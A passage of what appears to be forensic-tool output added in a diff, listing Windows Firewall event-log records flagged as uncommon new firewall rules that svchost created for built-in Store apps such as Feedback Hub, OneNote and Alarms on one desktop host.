+EmbeddedContext: '@{Microsoft.WindowsFeedbackHub_1.2401.20253.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsFeedbackHub/Resources/AppStoreName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{FAC46623-7836-4A69-8D20-096F2526AB34}'
+RuleName: '@{Microsoft.WindowsFeedbackHub_1.2401.20253.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsFeedbackHub/Resources/AppStoreName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:15:12.135946+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,578,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.WindowsFeedbackHub_1.2401.20253.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsFeedbackHub/Resources/AppStoreName}'
+Flags: 3
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 6
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{0DD5319B-9A19-4FC6-BB67-3DB52CCAF1A0}'
+RuleName: '@{Microsoft.WindowsFeedbackHub_1.2401.20253.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsFeedbackHub/Resources/AppStoreName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 1
+ServiceName: ''
+",
+2024-02-28T04:15:12.137006+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,579,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.WindowsFeedbackHub_1.2401.20253.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsFeedbackHub/Resources/AppStoreName}'
+Flags: 3
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 6
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{7E9E5A34-7667-4B1C-B370-F9553DEBFDF0}'
+RuleName: '@{Microsoft.WindowsFeedbackHub_1.2401.20253.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsFeedbackHub/Resources/AppStoreName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 1
+ServiceName: ''
+",
+2024-02-28T04:15:12.137942+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,580,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.WindowsFeedbackHub_1.2401.20253.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsFeedbackHub/Resources/AppStoreName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{F2733E71-C3B4-4338-B53E-39438A8584C0}'
+RuleName: '@{Microsoft.WindowsFeedbackHub_1.2401.20253.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsFeedbackHub/Resources/AppStoreName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:15:12.139227+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,581,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.WindowsFeedbackHub_1.2401.20253.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsFeedbackHub/Resources/AppStoreName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{D25652F9-E0D4-4D62-8456-DE31C55A788D}'
+RuleName: '@{Microsoft.WindowsFeedbackHub_1.2401.20253.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsFeedbackHub/Resources/AppStoreName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:15:12.140364+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,582,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.WindowsFeedbackHub_1.2401.20253.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsFeedbackHub/Resources/AppStoreName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 3
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{368A3156-6C68-45BB-A4EA-710D120F4F5C}'
+RuleName: '@{Microsoft.WindowsFeedbackHub_1.2401.20253.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsFeedbackHub/Resources/AppStoreName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:18:06.505717+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,594,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: OneNote for Windows 10
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{C46EA23E-4EAF-4AB2-8403-B0548E3444C2}'
+RuleName: OneNote for Windows 10
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:18:06.506966+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,595,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: OneNote for Windows 10
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{5DD02441-721B-48FC-B656-A5DC7DE0D4C2}'
+RuleName: OneNote for Windows 10
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:18:06.508054+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,596,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: OneNote for Windows 10
+Flags: 3
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 6
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{5233A52F-9635-4B5B-AB35-59CF9D9A774B}'
+RuleName: OneNote for Windows 10
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 1
+ServiceName: ''
+",
+2024-02-28T04:18:06.508971+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,597,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: OneNote for Windows 10
+Flags: 3
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 6
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{D29C6AE8-4EAB-464D-A79F-3DE565B60034}'
+RuleName: OneNote for Windows 10
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 1
+ServiceName: ''
+",
+2024-02-28T04:18:06.509855+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,598,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: OneNote for Windows 10
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{2DE3B96C-4C13-495A-A40D-D08D47AC7A70}'
+RuleName: OneNote for Windows 10
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:18:06.510944+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,599,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: OneNote for Windows 10
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{03B92724-9440-403B-B6A2-7D849C9E40B0}'
+RuleName: OneNote for Windows 10
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:18:06.512050+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,600,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: OneNote for Windows 10
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 3
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{4EA4DB3B-0FA5-4622-812F-5BE8F336F6D4}'
+RuleName: OneNote for Windows 10
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:18:36.349958+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,605,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.WindowsAlarms_11.2401.9.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsAlarms/Resources/AppStoreName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{19F1178A-4624-4FB3-BCED-A1312410DA3F}'
+RuleName: '@{Microsoft.WindowsAlarms_11.2401.9.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsAlarms/Resources/AppStoreName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:18:36.351246+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,606,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.WindowsAlarms_11.2401.9.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsAlarms/Resources/AppStoreName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{D16F9C12-D2D0-4C24-9B33-1C7017F0EA57}'
+RuleName: '@{Microsoft.WindowsAlarms_11.2401.9.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsAlarms/Resources/AppStoreName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:18:36.352967+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,607,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.WindowsAlarms_11.2401.9.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsAlarms/Resources/AppStoreName}'
+Flags: 3
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 6
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{81357004-5112-4E04-8CB8-D4D09F27F9A9}'
+RuleName: '@{Microsoft.WindowsAlarms_11.2401.9.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsAlarms/Resources/AppStoreName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 1
+ServiceName: ''
+",
+2024-02-28T04:18:36.354456+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,608,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.WindowsAlarms_11.2401.9.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsAlarms/Resources/AppStoreName}'
+Flags: 3
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 6
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{6C1A34A8-4AEF-4DED-AD02-9A9F2DC32026}'
+RuleName: '@{Microsoft.WindowsAlarms_11.2401.9.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsAlarms/Resources/AppStoreName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 1
+ServiceName: ''
+",
+2024-02-28T04:18:36.355786+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,609,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.WindowsAlarms_11.2401.9.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsAlarms/Resources/AppStoreName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{69DF23AA-64C7-40CF-978E-D1E5EB743333}'
+RuleName: '@{Microsoft.WindowsAlarms_11.2401.9.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsAlarms/Resources/AppStoreName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:18:36.357039+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,610,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.WindowsAlarms_11.2401.9.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsAlarms/Resources/AppStoreName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{837D4B1A-CD06-4B36-B26A-5F1993AC745F}'
+RuleName: '@{Microsoft.WindowsAlarms_11.2401.9.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsAlarms/Resources/AppStoreName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:18:36.358467+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,611,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.WindowsAlarms_11.2401.9.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsAlarms/Resources/AppStoreName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 3
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{30A8E44C-7B83-4C5E-81C4-87B87826760D}'
+RuleName: '@{Microsoft.WindowsAlarms_11.2401.9.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsAlarms/Resources/AppStoreName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:54:48.552700+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,624,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.MixedReality.Portal_2000.21051.1282.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.MixedReality.Portal/Resources/PkgDisplayName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{3957ED79-0476-4781-AC32-51B32578A752}'
+RuleName: '@{Microsoft.MixedReality.Portal_2000.21051.1282.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.MixedReality.Portal/Resources/PkgDisplayName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:54:48.553756+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,625,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.MixedReality.Portal_2000.21051.1282.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.MixedReality.Portal/Resources/PkgDisplayName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{D0DC26F6-9079-479E-B3B8-661C499B5584}'
+RuleName: '@{Microsoft.MixedReality.Portal_2000.21051.1282.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.MixedReality.Portal/Resources/PkgDisplayName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:55:46.137342+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,639,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.DesktopAppInstaller_1.21.3482.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.DesktopAppInstaller/Resources/appDisplayName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{93E5564E-A272-4BB6-8D4D-5F3A06793FC2}'
+RuleName: '@{Microsoft.DesktopAppInstaller_1.21.3482.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.DesktopAppInstaller/Resources/appDisplayName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:55:46.138837+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,640,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.DesktopAppInstaller_1.21.3482.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.DesktopAppInstaller/Resources/appDisplayName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{B8E29C0A-EE0D-4795-A818-E7BBFDB7D93A}'
